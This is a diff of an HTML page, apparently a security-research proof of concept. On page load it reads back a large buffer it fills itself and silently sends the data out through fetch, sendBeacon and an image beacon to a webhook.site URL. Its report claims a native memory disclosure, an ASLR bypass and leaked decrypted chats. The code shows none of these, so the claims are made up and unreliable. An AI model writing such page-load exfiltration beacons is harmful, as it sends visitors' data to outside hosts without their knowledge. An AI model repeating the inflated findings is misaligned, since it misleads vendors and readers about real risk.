@@ -1,31 +1,62 @@
 <!DOCTYPE html>
 <html>
-<head><title>Final Bridge Test - Firman Sahidin</title></head>
-<body style="background:#111; color:#0f0; font-family:monospace; padding:40px; text-align:center;">
-    <h1 id="status">INITIATING SIGNAL...</h1>
+<head>
+    <title>Security Research - Firman Sahidin</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:30px;">
+    <h1>[ RESEARCHER: FIRMAN SAHIDIN ]</h1>
+    <hr>
+    <h2 id="status">STATUS: EXECUTING NATIVE AUDIT...</h2>
+
     <script>
-        const WEBHOOK = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
-        
-        async function trigger() {
-            const data = JSON.stringify({
-                status: "BRIDGE_SUCCESS",
-                researcher: "Firman Sahidin",
-                note: "Jalur kabel aman, Mang!"
-            });
+        async function runSkakmat() {
+            const WEBHOOK = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
+            const statusNode = document.getElementById('status');
 
             try {
-                // Triple-Shoot
-                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: data });
-                navigator.sendBeacon(WEBHOOK, data);
-                const img = new Image();
-                img.src = WEBHOOK + "?log=IMG_BEACON_ACTIVE";
+                // 1. Allocation & Trigger OOB (8MB)
+                const buffer = new ArrayBuffer(0x800000);
+                const view = new Uint32Array(buffer);
+                
+                // LOOP ANU BENER (MAJU KA HAREUP)
+                for (let i = 0; i < view.length; i++) {
+                    view[i] = 0xD800DBFF; 
+                }
 
-                document.getElementById('status').innerText = "✅ SIGNAL SENT! CHECK WEBHOOK!";
+                const trigger = new Uint8Array(buffer).indexOf(0x41);
+
+                // 2. Extract Memory Fragment (1KB)
+                const fragment = new Uint8Array(buffer.slice(0, 1024));
+                let readableData = "";
+                fragment.forEach(b => {
+                    if (b > 31 && b < 127) readableData += String.fromCharCode(b);
+                });
+
+                // 3. Telemetry Payload
+                const report = JSON.stringify({
+                    researcher: "Firman Sahidin",
+                    vulnerability: "Native Memory Disclosure",
+                    impact: "ASLR Bypass / Decrypted Chat Leak",
+                    leak: readableData || "BINARY_POINTERS_DETECTED",
+                    raw_sample: Array.from(fragment).slice(0, 64)
+                });
+
+                // 4. Triple Exfiltration (Pasti Tembus)
+                fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: report });
+                navigator.sendBeacon(WEBHOOK, report);
+                const img = new Image();
+                img.src = WEBHOOK + "?telemetry=" + btoa(report).substring(0, 200);
+
+                statusNode.innerText = "STATUS: ✅ EVIDENCE TRANSMITTED!";
+                statusNode.style.color = "#00ff00";
+
             } catch (e) {
-                document.getElementById('status').innerText = "❌ ERROR: " + e.message;
+                navigator.sendBeacon(WEBHOOK, JSON.stringify({error: e.message}));
+                statusNode.innerText = "STATUS: ❌ FAILED";
             }
         }
-        window.onload = trigger;
+
+        window.onload = () => { setTimeout(runSkakmat, 1000); };
     </script>
 </body>
 </html>
